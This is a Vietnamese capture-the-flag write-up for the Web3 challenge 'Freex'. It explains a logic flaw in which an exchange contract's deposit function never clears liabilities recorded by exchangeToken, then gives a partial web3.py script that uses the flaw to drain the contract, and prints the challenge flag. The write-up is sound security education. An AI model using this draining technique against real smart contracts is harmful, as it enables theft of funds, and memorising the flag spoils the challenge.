# Freex

**Category:** Web3  
**Author:** ReiKage  
**Team:** 6h4T9pTpR0  

## Lời nói đầu
Chào các bạn, hôm nay mình sẽ chia sẻ chi tiết cách mình và team đã "xử đẹp" bài **Freex** trong giải WannaGame 2025 vừa rồi. Đây là một bài Smart Contract khá thú vị về lỗi logic trong việc quản lý trạng thái (state) của hợp đồng. Cảm giác khi tìm ra bug này đúng kiểu "Eureka!" luôn ấy.

## 1. Phân tích & Reconnaissance (Trinh sát)

Đầu tiên, Ban tổ chức cho mình một cái Source Code của Smart Contract `Exchange.sol`. Nhiệm vụ là phải rút hết tiền (WannaETH/OneETH) trong cái sàn này.

Mình bắt đầu đọc code và chú ý đến 2 hàm quan trọng nhất:
1.  `exchangeToken(address token, uint256 amount)`: Hàm này cho phép mình đổi token rác lấy `WannaETH`.
2.  `deposit(address token, uint256 amount)`: Hàm này cho phép nạp token vào để làm thanh khoản (liquidity).

### Phát hiện Lỗ hổng (The Bug)
Khi mình đọc kỹ hàm `exchangeToken`, mình thấy nó có một cơ chế "ghi nợ" (liability).
- Nếu token mình đưa vào không nằm trong whitelist, sàn vẫn cho mình nhận `WannaETH` **nhưng** nó sẽ ghi lại là mình đang "nợ" sàn số token đó.

```solidity
// Đoạn code gây lú
balances[msg.sender] += amount; // Cộng tiền ảo WannaETH
liabilities[msg.sender][token] += amount; // Ghi nợ token rác
```

Sau đó, mình ngó sang hàm `deposit`. Bình thường, nếu mình nạp tiền vào, hệ thống phải kiểm tra xem mình có đang nợ nần gì không để trừ nợ chứ đúng không? Nhưng **KHÔNG**!

Hàm `deposit` chỉ đơn thuần là:
1.  Nhận token từ ví mình chuyển vào.
2.  Cập nhật số dư token của mình trong sàn.
3.  **Nó hoàn toàn quên mất việc kiểm tra hay trừ cái `liabilities` kia!**

=> **Ý tưởng:** Mình có thể "vay" tiền của sàn (lấy WannaETH), bị ghi nợ, sau đó "trả lại" số token đó qua đường `deposit`. Sàn sẽ nghĩ là mình nạp tiền mới vào, trong khi mình vẫn giữ nguyên cục `WannaETH` đã vay. Thế là lãi to!

## 2. Lên kịch bản khai thác (Exploitation Strategy)

Để thực hiện cú lừa này, mình cần các bước sau:

1.  **Chuẩn bị công cụ:** Mình cần một cái "Fake Token" (Token giả) do mình tự tạo ra. Tại sao? Vì mình cần số lượng lớn để swap và mình phải là chủ sở hữu để `mint` bao nhiêu tùy thích.
2.  **Bước 1 - Vay tiền (Tạo nợ):**
    - Gọi `exchangeToken(FakeToken, 15 ETH)`.
    - Sàn sẽ đưa mình 15 `WannaETH`.
    - Sàn ghi sổ: "Thằng ReiKage nợ 15 FakeToken".
3.  **Bước 2 - Trả nợ giả (Xóa dấu vết):**
    - Gọi `deposit(FakeToken, 15 ETH)`.
    - Mình chuyển trả 15 FakeToken cho sàn.
    - Sàn cập nhật: "Thằng ReiKage vừa nạp 15 FakeToken, số dư FakeToken của nó là 0". (Nó không hề trừ cái nợ ở bước 1).
4.  **Bước 3 - Rút tiền thật:**
    - Lúc này mình đang có 15 `WannaETH` trong tay (từ bước 1).
    - Gọi `claimReceivedWannaETH()` để đổi 15 `WannaETH` này thành tiền thật (OneETH) và chuồn lẹ.

## 3. Viết Tool & Script

Mình sử dụng Python và thư viện `web3.py` để viết script tự động. Dưới đây là chi tiết từng phần:

### Chuẩn bị môi trường
```bash
pip install web3
```

### Script khai thác (`solve.py`)

```python
from web3 import Web3
import json

# 1. Kết nối vào mạng Blockchain của giải
w3 = Web3(Web3.HTTPProvider('http://IP_CUA_GIAI:PORT'))
account_address = "ĐỊA_CHỈ_VÍ_CỦA_BẠN"
private_key = "PRIVATE_KEY_CỦA_BẠN"

# 2. Load Contract Exchange
exchange_address = "ĐỊA_CHỈ_CONTRACT_EXCHANGE"
exchange_abi = [...] # Copy ABI từ file json compiled ra

exchange = w3.eth.contract(address=exchange_address, abi=exchange_abi)

# 3. Deploy Fake Token
# Mình soạn sẵn bytecode của một ERC20 đơn giản hoặc dùng thư viện chuẩn
# Ở đây giả sử mình đã deploy xong và có địa chỉ FakeToken
fake_token_address = "ĐỊA_CHỈ_FAKE_TOKEN"
fake_token = w3.eth.contract(address=fake_token_address, abi=erc20_abi)

print(">>> Bắt đầu chiến dịch...")

# Bước 1: Approve cho sàn được phép tiêu FakeToken của mình
# Phải approve đủ số lượng nhé (ví dụ 15 ether)
amount = w3.to_wei(15, 'ether')
tx = fake_token.functions.approve(exchange_address, amount).build_transaction({
    'from': account_address,
    'nonce': w3.eth.get_transaction_count(account_address),
    'gas': 2000000,
    'gasPrice': w3.to_wei('10', 'gwei')
})
# Ký và gửi transaction... (đoạn này boilerplate code)

# Bước 2: Gọi exchangeToken để lấy WannaETH và tạo nợ
print(">>> Đang gọi exchangeToken...")
tx = exchange.functions.exchangeToken(fake_token_address, amount).build_transaction({
    'from': account_address,
    # ... các tham số gas như trên
})
# Gửi tx...

# Bước 3: Gọi deposit để "trả lại" token nhưng không bị trừ nợ
print(">>> Đang gọi deposit để lừa contract...")
tx = exchange.functions.deposit(fake_token_address, amount).build_transaction({
    'from': account_address,
    # ...
})
# Gửi tx...

# Bước 4: Rút tiền thật về ví
print(">>> Rút tiền (Cash out)...")
tx = exchange.functions.claimReceivedWannaETH().build_transaction({
    'from': account_address,
    # ...
})
# Gửi tx và chờ tiền về!
```

## Kết quả
Sau khi chạy script, mình check balance thì thấy tiền đã về ví. Submit flag và nhận điểm thôi!

**Flag:** `W1{HEre_fOr_Y0U_the_fReEEX-CH4LI3NgE-Fl@G889c}`
